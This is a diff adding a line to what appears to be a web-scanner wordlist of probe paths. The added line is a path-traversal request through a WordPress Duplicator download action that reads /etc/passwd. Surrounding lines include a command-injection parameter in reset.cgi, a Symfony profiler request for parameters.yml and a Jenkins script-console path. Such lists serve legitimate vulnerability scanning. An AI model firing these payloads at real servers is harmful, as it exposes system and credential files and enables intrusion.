@@ -16,6 +16,7 @@ password_control
 app_dev.php/_profiler/open?file=app/config/parameters.yml
 cgi-bin/reset.cgi?db_prefix=%26id%26
 cgi-bin/dmt/reset.cgi?db_prefix=%26id%26
+wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
 pubweb
 _vti_pvt/service.cnf
 jenkins/script
